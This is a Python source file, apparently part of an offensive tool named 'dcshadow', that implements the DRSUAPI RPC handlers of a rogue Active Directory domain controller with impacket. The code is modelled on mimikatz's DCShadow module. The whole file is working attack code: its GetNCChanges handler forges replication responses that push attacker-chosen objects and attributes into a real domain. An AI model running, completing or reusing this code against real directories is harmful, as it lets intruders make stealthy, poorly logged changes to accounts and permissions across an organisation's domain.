from R2Log import logger

from dcshadow.utils.server.RpcServer import RPCServerHandler
from dcshadow.utils.server.ServerUtils import get_ft
from impacket import uuid
from impacket.dcerpc.v5 import drsuapi
from datetime import datetime, timezone

from dcshadow.model.ReplicationAttribute import ReplicationAttributeSerializer

MSRPC_UUID_DRSUAPI = ("E3514235-4B06-11D1-AB04-00C04FC2DCD2", "4.0")

class DRSUAPIEndpointHandler(RPCServerHandler):
    def setup(self):
        RPCServerHandler.setup(self)
        self.DRSCallBacks = {  # https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/modules/rpc/kull_m_rpc_ms-drsr_c.c#L39
            0: self.DsBind,
            1: self.DsUnbind,
            3: self.DsGetNCChanges,
            4: self.DsUpdateRefs,
        }
        #self.transport.addCallbacks(MSRPC_UUID_DRSUAPI, '\\PIPE\\lsarpc', self.DRSCallBacks)
        self.transport.addCallbacks(MSRPC_UUID_DRSUAPI, '1337', self.DRSCallBacks)  # TODO named pipe or port ? both work

    def DsBind(self, data):  # https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L3022
        logger.debug("DRSUAPI: Bind request received")
        request = drsuapi.DRSBind(data)
        drs = drsuapi.DRS_EXTENSIONS_INT(data=b"".join(request['pextClient']['rgb']))
        bind_flags = [f.name for f in drsuapi.DRS_EXTENSIONS_INT_FLAGS if drs['dwFlags'] & f.value]
        # if drs['dwFlags'] & drsuapi.DRS_EXT_GETCHGREPLY_V6:
        #     logger.debug("Something will probably fail. ERROR_REVISION_MISMATCH ?")
        # if drs['dwFlags'] & drsuapi.DRS_EXT_STRONG_ENCRYPTION:
        #     logger.debug("Something will probably fail. SEC_E_ALGORITHM_MISMATCH ?")
        response = drsuapi.DRSBindResponse()
        drs_r = drsuapi.DRS_EXTENSIONS_INT()
        # drs_r['cb'] = len(drsuapi.DRS_EXTENSIONS_INT()) - len(dtypes.DWORD())  # needed?
        drs_r['dwFlags'] = drsuapi.DRS_EXT_BASE | \
            drsuapi.DRS_EXT_RESTORE_USN_OPTIMIZATION | \
            drsuapi.DRS_EXT_INSTANCE_TYPE_NOT_REQ_ON_MOD | \
            drsuapi.DRS_EXT_STRONG_ENCRYPTION | \
            drsuapi.DRS_EXT_GETCHGREQ_V8
        response['ppextServer']['cb'] = len(drs_r.getData())
        response['ppextServer']['rgb'] = list(drs_r.getData())
        # let's create a random, low collision probability --> uuid
        # hDrs is 20 bytes, uuid.generate() returns 16 bytes
        response['phDrs'] = b"\x00" * 4 + uuid.generate()
        response['ErrorCode'] = 0  # success
        logger.debug("DRSUAPI: sending Bind response")
        return response

    def DsUnbind(self, data):
        logger.debug("DRSUAPI: Unbind request received")
        request = drsuapi.DRSUnbind(data)
        response = drsuapi.DRSUnbindResponse()
        response['phDrs'] = request['phDrs']
        response['ErrorCode'] = 0  # success
        return response

    def DsGetNCChanges(self, data):
        logger.verbose("Answering GetNCChanges request")
        from dcshadow.manager.Controller import ExecManager
        rogue_dc = ExecManager().get_repl_manager().rogue_dc
        repl_objects = ExecManager().get_repl_objects()

        logger.debug("DRSUAPI: GetNCChanges request received")
        request = drsuapi.DRSGetNCChanges(data)
        logger.debug("GetNCChanges Level: %d" % request['dwInVersion'])

        # simulating request data
        request = drsuapi.DRSGetNCChanges(data=data)

        if request['dwInVersion'] == 8:
            if request['pmsgIn']['V8']['pNC']:
                response = drsuapi.DRSGetNCChangesResponse()
                response['pdwOutVersion'] = 6
                response['pmsgOut']['tag'] = 6
                response['pmsgOut']['V6']['uuidDsaObjSrc'] = rogue_dc.object_guid
                response['pmsgOut']['V6']['uuidInvocIdSrc'] = rogue_dc.invocation_id
                response['pmsgOut']['V6']['pNC'] = request['pmsgIn']['V8']['pNC']
                # response['pmsgOut']['V6']['usnvecFrom']  # must be set to all 0 structure
                response['pmsgOut']['V6']['usnvecTo']['usnHighObjUpdate'] = int(rogue_dc.max_update_seq_num)
                response['pmsgOut']['V6']['usnvecTo']['usnHighPropUpdate'] = int(rogue_dc.max_update_seq_num)
                response['pmsgOut']['V6']['usnvecTo']['usnReserved'] = 0
                response['pmsgOut']['V6']['pUpToDateVecSrc']['dwVersion'] = 2
                response['pmsgOut']['V6']['pUpToDateVecSrc']['dwReserved1'] = 0
                response['pmsgOut']['V6']['pUpToDateVecSrc']['cNumCursors'] = 1
                response['pmsgOut']['V6']['pUpToDateVecSrc']['dwReserved2'] = 0
                _rgCursor = drsuapi.UPTODATE_CURSOR_V2()
                _rgCursor['uuidDsa'] = rogue_dc.object_guid
                _rgCursor['usnHighPropUpdate'] = int(rogue_dc.max_update_seq_num)
                ft = get_ft(datetime.now(timezone.utc))
                _rgCursor['timeLastSyncSuccess'] = int(ft / 10000)
                response['pmsgOut']['V6']['pUpToDateVecSrc']['rgCursors'] = [_rgCursor]
                response['pmsgOut']['V6']['ulExtendedRet'] = drsuapi.EXOP_ERR.enumItems.EXOP_ERR_SUCCESS.value  # 0x00000001
                response['pmsgOut']['V6']['cNumObjects'] = 1  # TODO change this to a dynamic value according to the number of objects to change TODO should be the number of things to "push" ?? :: (pDCShadowDomainInfoInUse->request? pDCShadowDomainInfoInUse->request->cNumObjects : 0);
                # TODO cNumObjects should be "Count of items in the pObjects linked list", maybe best to dynamically calculate depending on response['pmsgOut']['V6']['pObjects'] ??
                response['pmsgOut']['V6']['cNumBytes'] = 0  # should probably be NOT 0, but mimikatz does this, so why wouldn't we
                response['pmsgOut']['V6']['PrefixTableSrc'] = drsuapi.SCHEMA_PREFIX_TABLE()
                _default_prefix_table = ReplicationAttributeSerializer.get_prefix_table()
                response['pmsgOut']['V6']['PrefixTableSrc']['PrefixCount'] = len(_default_prefix_table)
                response['pmsgOut']['V6']['PrefixTableSrc']['pPrefixEntry'] = _default_prefix_table
                _replentinflist = None
                _previous_replentinflist = None
                for repl_object in reversed(repl_objects):
                    _replentinflist = drsuapi.PREPLENTINFLIST()
                    # setting the link to the next object
                    if _previous_replentinflist is not None:
                        _replentinflist['pNextEntInf'] = _previous_replentinflist
                    else:
                        _replentinflist['pNextEntInf'] = drsuapi.NULL
                    # setting the object's identifiers
                    _replentinflist['Entinf']['pName']['SidLen'] = 0  # TODO defined if objectSID is set
                    _replentinflist['Entinf']['pName']['Sid'] = ''  # TODO defined if objectSID is set https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L2351-L2355
                    _replentinflist['Entinf']['pName']['Guid'] = drsuapi.NULLGUID
                    _replentinflist['Entinf']['pName']['NameLen'] = len(repl_object.distinguished_name)
                    _replentinflist['Entinf']['pName']['StringName'] = (repl_object.distinguished_name + '\x00')
                    _replentinflist['Entinf']['pName']['structLen'] = len(_replentinflist['Entinf']['pName'].getData())
                    _replentinflist['Entinf']['ulFlags'] = drsuapi.ENTINF_FROM_MASTER
                    # setting the object's attributes
                    for attr in repl_object.attributes:
                        _replentinflist['Entinf']['AttrBlock']['pAttr'].append(attr.serialized)
                    # TODO : go through the values and encrypt the sensitive stuff if needed: https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L3160
                    _replentinflist['Entinf']['AttrBlock']['attrCount'] = len(_replentinflist['Entinf']['AttrBlock']['pAttr'])
                    # setting some object's metadata
                    _replentinflist['fIsNCPrefix'] = repl_object.distinguished_name == rogue_dc.domain_nc  # mimikatz compares objectDN to DomainName but I think it's wrong. According to doc, "TRUE only if the object is an NC root.". We should compare the objectDN to the Domain in DN format (DC=domain,DC=local), not FQDN format (domain.local)
                    _replentinflist['pParentGuid'] = repl_object.parent_guid
                    for attr in repl_object.attributes:  # TODO one "PROPERTY_META_DATA_EXT" will be set for each property to be replicated https://github.com/gentilkiwi/mimikatz/blob/0c611b1445b22327fcc7defab2c09b63b4f59804/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L2385-L2401
                        # TODO right now we are defining static values (else statement in mimikatz), but later on we will need to dynamically do this depending on the metadataext of each attribute to replicate
                        _rgMetaData = drsuapi.PROPERTY_META_DATA_EXT()
                        _rgMetaData['dwVersion'] = 1
                        _rgMetaData['timeChanged'] = int(ft / 10000000)
                        _rgMetaData['uuidDsaOriginating'] = rogue_dc.object_guid
                        _rgMetaData['usnOriginating'] = int(rogue_dc.max_update_seq_num) + 1
                        _replentinflist['pMetaDataExt']['rgMetaData'].append(_rgMetaData)
                    _replentinflist['pMetaDataExt']['cNumProps'] = len(_replentinflist['pMetaDataExt']['rgMetaData'])
                    _previous_replentinflist = _replentinflist
                response['pmsgOut']['V6']['pObjects'] = _replentinflist
                response['pmsgOut']['V6']['fMoreData'] = False
                response['pmsgOut']['V6']['cNumNcSizeObjects'] = 0
                response['pmsgOut']['V6']['cNumNcSizeValues'] = 0
                response['pmsgOut']['V6']['cNumValues'] = 0
                response['pmsgOut']['V6']['dwDRSError'] = 0
                # TODO handle sessionKey retrieval and encoding when handling sensitive data in the replication, right now PoCing with non-sensitive stuff
                return response
            else:
                logger.debug("No pNC (pointer to naming context in GetNCChanges request")
        else:
            logger.debug("ERROR_REVISION_MISMATCH")
        logger.debug("DRSUAPI: sending GetNCChanges response")

    def DsUpdateRefs(self, data):
        logger.debug("DRSUAPI: UpdateRefs request received")
        from dcshadow.manager.Controller import ExecManager
        ExecManager().finished_replication()
        request = drsuapi.DRSUpdateRefs(data)
        response = drsuapi.DRSUpdateRefsResponse()
        response['ErrorCode'] = 0  # success
        logger.debug("DRSUAPI: sending UpdateRefs response")
        return response
